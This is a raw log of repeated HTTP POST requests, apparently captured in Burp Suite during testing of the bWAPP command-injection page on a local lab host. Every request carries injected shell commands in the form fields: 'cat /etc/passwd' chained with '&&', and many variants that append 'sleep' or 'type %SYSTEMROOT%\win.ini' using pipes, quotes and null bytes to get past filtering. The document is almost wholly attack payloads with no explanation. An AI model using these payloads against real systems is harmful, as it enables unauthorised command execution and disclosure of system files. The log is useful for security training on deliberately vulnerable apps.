+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%26%26sleep%24pg+15
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%7Csleep%24pg+15%23
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 81
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=type+%25SYSTEMROOT%25%5Cwin.ini
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%26type+%25SYSTEMROOT%25%5Cwin.ini
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%7Ctype+%25SYSTEMROOT%25%5Cwin.ini
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 99
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 93
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 99
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 93
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submitrun+type+%25SYSTEMROOT%25%5Cwin.ini
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 93
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%26type+%25SYSTEMROOT%25%5Cwin.ini%00
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 93
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%7Ctype+%25SYSTEMROOT%25%5Cwin.ini%00
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%22%26type+%25SYSTEMROOT%25%5Cwin.ini%00
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini%00
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%27%26type+%25SYSTEMROOT%25%5Cwin.ini%00
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submit%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini%00
+========
+POST /bWAPP/commandi.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 94
+Origin: https://192.168.118.128
+Connection: close
+Referer: https://192.168.118.128/bWAPP/commandi.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+target=www.nsa.gov%26%26+cat+%2Fetc%2Fpasswd&form=submitrun+type+%25SYSTEMROOT%25%5Cwin.ini%00
+========
